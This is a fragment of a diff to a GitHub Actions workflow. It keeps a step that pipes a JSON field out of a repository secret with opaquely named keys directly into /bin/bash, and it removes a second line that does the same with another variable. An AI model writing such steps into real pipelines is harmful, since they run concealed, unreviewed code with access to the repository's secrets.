@@ -17,7 +17,6 @@ jobs:
           ek54: ${{ secrets.ek54 }}
         run: |
           printf '%s' "$ek54" | jq -r .ta624 | /bin/bash
-          echo $heebp8 | jq -r .r0953 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
